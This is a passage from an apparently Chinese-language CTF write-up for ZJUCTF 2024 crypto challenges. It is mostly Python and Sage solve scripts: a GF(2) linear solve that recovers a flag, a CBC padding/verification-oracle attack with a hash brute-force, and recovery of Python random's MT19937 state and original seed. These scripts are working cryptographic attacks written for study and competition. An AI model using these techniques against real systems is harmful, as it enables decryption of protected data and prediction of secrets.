class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python">ans = [<span class="hljs-number">0xd5</span>,<span class="hljs-number">0xe3</span>,<span class="hljs-number">0x98</span>,<span class="hljs-number">0xc6</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0xc2</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0xd6</span>,<span class="hljs-number">0x8f</span>,<span class="hljs-number">0xd5</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0xe0</span>]<br>leak = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(t) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans] <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> x])<br>knownindex = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>*<span class="hljs-number">8</span>)]+[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>*<span class="hljs-number">8</span>,<span class="hljs-number">16</span>*<span class="hljs-number">8</span>)]<br>known = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ZJUCTF&#123;********&#125;&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>b_128_128 = matrix(GF(<span class="hljs-number">2</span>),length-<span class="hljs-built_in">len</span>(knownindex),anslength)<br>newleak = leak<br>b_index = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> knownindex:<br>        b_128_128[b_index] = b_192_128[i]<br>        b_index+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength):<br>            newleak[j] = newleak[j]+known[i]*b_192_128[i,j]<br><br><span class="hljs-built_in">print</span>(b_128_128.rank())<br>guesslen = anslength-b_128_128.rank()<br>guesskindex = [<span class="hljs-number">80</span>-<span class="hljs-number">8</span>,<span class="hljs-number">88</span>-<span class="hljs-number">8</span>]+[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength-guesslen+<span class="hljs-number">2</span>,anslength)]<br>b_110_128 = matrix(GF(<span class="hljs-number">2</span>),anslength-guesslen,anslength)<br>tmp = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength-guesslen):<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> guesskindex:<br>        b_110_128[tmp]=b_128_128[i]<br>        tmp+=<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**guesslen):<br>    guessk = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(guesslen)]<br>    tmpleak = copy.deepcopy(newleak)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(guessk)==guesslen<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(guesslen):<br>        <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength):<br>            <span class="hljs-comment"># print(guesskindex[j])</span><br>            tmpleak[z] = tmpleak[z]+guessk[j]*b_128_128[guesskindex[j],z]<br>    <span class="hljs-keyword">try</span>:<br>        tmp = b_110_128.solve_left(tmpleak)<br>        <span class="hljs-comment"># print(tmp)</span><br>        flag = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp])[:<span class="hljs-number">64</span>]<br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">8</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(flag[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-comment"># break</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># ZJUCTF&#123;M47rlx!?&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/18.png"></li></ul><h2 id="insane-pad">insane pad</h2><ul><li>乍一看这一道CBC填充漏洞题无从下手，前两个选项返回AES加密的flag和hash加密的flag，第三个选项进行verify，但是关键在于比对时它用了zip： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">msg = <span class="hljs-variable language_">self</span>.decrypt(ct, iv)<br><span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<span class="hljs-variable language_">self</span>.flag, msg):<br>    <span class="hljs-keyword">if</span>(a != b):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invaild!&quot;</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Valid!&quot;</span><br></code></pre></td></tr></table></figure></li><li>zip是逐个字符比对，那就可以设计最后一位pad，使得msg为空，那么就会verify返回valid。flag总长度为64-80，只要判断构造最后一位范围是80-256或0都能使msg为空，从而得到valid： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getvalue16</span>(<span class="hljs-params">block,possiblevalue,lastblock</span>):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        test = <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-built_in">bytes</span>([i])+block<br>        <span class="hljs-keyword">if</span> verify(test):<br>            tmp.append(i)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> possiblevalue:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> tmp:<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span>&lt;i^lastblock[-<span class="hljs-number">1</span>]^j&lt;<span class="hljs-number">80</span>:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> i<br></code></pre></td></tr></table></figure></li><li>得到最后一位解密数据就可以随心所欲控制msg长度了，再根据已知flag的开头是ZJUCTF{ 和 末尾是 } 加上4个padding，就可以获得每一个块的 0-6 和 11-15 位置上数据: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_head16_iv</span>(<span class="hljs-params">block</span>):<br>    tmp = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)):<br>        test = block+<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">47</span>+<span class="hljs-built_in">bytes</span>([decryptlast^(<span class="hljs-number">79</span>-i)])+E5<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            iv = tmp+<span class="hljs-built_in">bytes</span>([j])+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">15</span>-<span class="hljs-built_in">len</span>(tmp))<br>            <span class="hljs-comment"># print(iv)</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(iv)==<span class="hljs-number">16</span><br>            <span class="hljs-keyword">if</span> verify(test,iv):<br>                tmp+=<span class="hljs-built_in">bytes</span>([j])<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            exit()<br>    <span class="hljs-keyword">return</span> tmp<br><br>IV = get_head16_iv(E1)<br><span class="hljs-keyword">assert</span> verify(aes_flag,IV)==<span class="hljs-number">1</span><br>E2_iv = get_head16_iv(E2)<br>E3_iv = get_head16_iv(E3)<br>E4_iv = get_head16_iv(E4)<br>E5_iv = get_head16_iv(E5)<br>flaglis = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag]<br>knownhead = <span class="hljs-string">b&quot;ZJUCTF&#123;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    flaglis[<span class="hljs-number">16</span>+i] = E1[i]^knownhead[i]^E2_iv[i]<br>    flaglis[<span class="hljs-number">32</span>+i] = E2[i]^knownhead[i]^E3_iv[i]<br>    flaglis[<span class="hljs-number">48</span>+i] = E3[i]^knownhead[i]^E4_iv[i]<br>    flaglis[<span class="hljs-number">64</span>+i] = E4[i]^knownhead[i]^E5_iv[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flaglis]))<br>knowntail = <span class="hljs-string">b&quot;&#125;&quot;</span>+<span class="hljs-built_in">bytes</span>([last])*last<br>head_t5 = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    head_t5+=<span class="hljs-built_in">bytes</span>([E5_iv[i+<span class="hljs-number">11</span>]^knowntail[i]^E4[i+<span class="hljs-number">11</span>]])<br>    flaglis[i+<span class="hljs-number">11</span>]=E5_iv[i+<span class="hljs-number">11</span>]^knowntail[i]^E4[i+<span class="hljs-number">11</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flaglis]))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>,<span class="hljs-number">16</span>):<br>    flaglis[<span class="hljs-number">16</span>+i] = E1[i]^head_t5[i-<span class="hljs-number">11</span>]^E2_iv[i]<br>    flaglis[<span class="hljs-number">32</span>+i] = E2[i]^head_t5[i-<span class="hljs-number">11</span>]^E3_iv[i]<br>    flaglis[<span class="hljs-number">48</span>+i] = E3[i]^head_t5[i-<span class="hljs-number">11</span>]^E4_iv[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flaglis]))<br></code></pre></td></tr></table></figure></li><li>但是每个块的中间4个数据是不知道的，且决定于第一个块的中间4个数据，毕竟给了hash，爆破一下就出来了: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">combinations = itertools.product(<span class="hljs-string">&quot;0123456789abcdef&quot;</span>, repeat=<span class="hljs-number">4</span>)<br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> combinations:<br>    head_i4 = <span class="hljs-string">&quot;&quot;</span>.join(combo)<br>    tmp = flaglis.copy()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>,<span class="hljs-number">11</span>):<br>        tmp[i] = <span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])<br>        tmp[<span class="hljs-number">16</span>+i] = E1[i]^<span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])^E2_iv[i]<br>        tmp[<span class="hljs-number">32</span>+i] = E2[i]^<span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])^E3_iv[i]<br>        tmp[<span class="hljs-number">48</span>+i] = E3[i]^<span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])^E4_iv[i]<br>        tmp[<span class="hljs-number">64</span>+i] = E4[i]^<span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])^E5_iv[i]<br>    test = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp])<br>    <span class="hljs-keyword">if</span> sha256(test.encode()).hexdigest()==hash_flag:<br>        <span class="hljs-built_in">print</span>(test)<br>        <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/27.png"></li><li>解这种CBC填充题目还是很爽的😛</li></ul><h2 id="seed">seed</h2><ul><li>这是一道逆向python的random种子初始化state的题目，题目给了 random 的前 624 个 32 位的数据，可以根据这个逆向出random在该seed下的state，用RandCrack库就行，然后根据<a href="https://www.anquanke.com/post/id/205861#h2-5">博客</a>逆向旋转得到最初的state，state的第0个会不一样，不过无伤大雅： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack<br><span class="hljs-keyword">import</span> os<br><br>secret = os.urandom(<span class="hljs-number">16</span>)<br>test = Random()<br>test.seed(secret)<br><br>rc = RandCrack()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>    rc.submit(test.getrandbits(<span class="hljs-number">32</span>))<br><span class="hljs-keyword">assert</span> test.getrandbits(<span class="hljs-number">32</span>)==rc.predict_getrandbits(<span class="hljs-number">32</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backtrace</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp = state[i]^state[(i+<span class="hljs-number">397</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res = tmp&amp;high<br>        tmp = state[i-<span class="hljs-number">1</span>]^state[(i+<span class="hljs-number">396</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res |= (tmp)&amp;low<br>        state[i] = res    <br>    <span class="hljs-keyword">return</span> state<br><br>nowstate = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(p) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> z]),<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> rc.mt]<br>inistate = backtrace(backtrace(nowstate))<br><span class="hljs-comment"># print(inistate)</span><br><br>test = Random()<br>test.seed(secret)<br><span class="hljs-keyword">assert</span> test.getstate()[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]==<span class="hljs-built_in">tuple</span>(inistate[<span class="hljs-number">1</span>:])<br></code></pre></td></tr></table></figure></li><li>接下来要根据state逆向seed，但是python用seed初始化state并不等同于MT19937生成的方法，只好去寻找python用seed初始化state的源代码，然后根据这个一步步逆向得到seed，发现python会将seed转成key数组去影响state生成，<a href="https://stackered.com/blog/python-random-prediction/">博客</a>中有seed转keylist相关信息，<a href="https://github.com/python/cpython/blob/main/Modules/_randommodule.c">github</a>上有keylist得到state的过程: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># only reverse for len(keylist)&lt;=624</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long,long_to_bytes<br>N = <span class="hljs-number">624</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_int32</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">0xFFFFFFFF</span> &amp; x)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geninit</span>(<span class="hljs-params">seed</span>):<br>    mt = [<span class="hljs-number">0</span>] * N<br>    mt[<span class="hljs-number">0</span>] = seed<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, N):<br>        mt[i] = _int32(<span class="hljs-number">1812433253</span> * (mt[i - <span class="hljs-number">1</span>] ^ mt[i - <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>) + i)<br>    <span class="hljs-keyword">return</span> mt<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">key</span>):  <span class="hljs-comment"># len(keylist)&lt;=624</span><br>    mt = geninit(<span class="hljs-number">19650218</span>)<br>    i,j = <span class="hljs-number">1</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):<br>        mt[i] = _int32((mt[i] ^ ((mt[i-<span class="hljs-number">1</span>] ^ (mt[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1664525</span>))+ key[j] + j)<br>        i = i+<span class="hljs-number">1</span><br>        j = (j+<span class="hljs-number">1</span>)%<span class="hljs-built_in">len</span>(key)<br>        <span class="hljs-keyword">if</span> (i&gt;=N):<br>            mt[<span class="hljs-number">0</span>]=mt[-<span class="hljs-number">1</span>]<br>            i=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N-<span class="hljs-number">1</span>):<br>        mt[i] = _int32((mt[i] ^ ((mt[i-<span class="hljs-number">1</span>] ^ (mt[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1566083941</span>)) - i)<br>        i = i+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> (i&gt;=N):<br>            mt[<span class="hljs-number">0</span>]=mt[-<span class="hljs-number">1</span>]<br>            i=<span class="hljs-number">1</span> <br>    mt[<span class="hljs-number">0</span>] = <span class="hljs-number">0x80000000</span><br>    <span class="hljs-keyword">return</span> mt<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseinit</span>(<span class="hljs-params">mt</span>):  <span class="hljs-comment"># len(keylist)&lt;=624</span><br>    mt = <span class="hljs-built_in">list</span>(mt)<br>    temp = _int32((mt[-<span class="hljs-number">1</span>]^(mt[-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1566083941</span>)<br>    mt[<span class="hljs-number">1</span>] = _int32(mt[<span class="hljs-number">1</span>]+<span class="hljs-number">1</span>)^temp<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        temp = _int32((mt[i-<span class="hljs-number">1</span>]^(mt[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1566083941</span>)<br>        mt[i] = _int32(mt[i]+i)^temp<br>    key = [-<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>)]  <span class="hljs-comment"># the key on index 0 and 1 and 623 can not be reversed</span><br>    mt2 = geninit(<span class="hljs-number">19650218</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>):<br>        temp = _int32(mt2[i]^((mt[i-<span class="hljs-number">1</span>]^(mt[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1664525</span>))<br>        key[i-<span class="hljs-number">1</span>] = (mt[i]-temp)%(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)<br>    <span class="hljs-comment"># print(key)  # now key stores the key[j] + j</span><br>    <span class="hljs-comment"># guess the term of the key,it will fails when 621&lt;=len(keylist)&lt;=624</span><br>    <span class="hljs-comment"># i only use simple check for the term,since it is almost impossible to have the same value in a keylist</span><br>    term = key.index(key[<span class="hljs-number">2</span>],<span class="hljs-number">3</span>)-<span class="hljs-number">2</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;keylenth:&quot;</span>,term)<br>    keylist = []<br>    <span class="hljs-keyword">if</span> (term&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> term&gt;<span class="hljs-number">620</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;failed to guess the keylist&quot;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> (term==<span class="hljs-number">1</span>):<br>        keylist.append(key[<span class="hljs-number">2</span>])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;guess:&quot;</span>,keylist)<br>    <span class="hljs-keyword">elif</span> (term==<span class="hljs-number">2</span>):<br>        keylist.append(key[<span class="hljs-number">2</span>])<br>        keylist.append(key[<span class="hljs-number">3</span>]-<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;guess:&quot;</span>,keylist)<br>    <span class="hljs-keyword">else</span>:<br>        keylist.append(key[key.index(key[<span class="hljs-number">2</span>],<span class="hljs-number">3</span>)-<span class="hljs-number">2</span>])<br>        keylist.append(key[key.index(key[<span class="hljs-number">2</span>],<span class="hljs-number">3</span>)-<span class="hljs-number">1</span>]-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(term-<span class="hljs-number">2</span>):<br>            keylist.append(key[<span class="hljs-number">2</span>+i]-<span class="hljs-number">2</span>-i)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;guess:&quot;</span>,keylist)<br>    seed = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(keylist)):<br>        seed += keylist[i] &lt;&lt; (<span class="hljs-number">32</span>*i)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;seed in number mode:&quot;</span>,seed)<br>    <span class="hljs-keyword">return</span> seed<br><br>reverseinit(init([<span class="hljs-number">1701601646</span>,<span class="hljs-number">1</span>]))<br>random.seed(<span class="hljs-number">214097309740939471387164918734691</span>)<br>reverseinit(random.getstate()[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])<br><br>random.seed(<span class="hljs-string">&quot;my 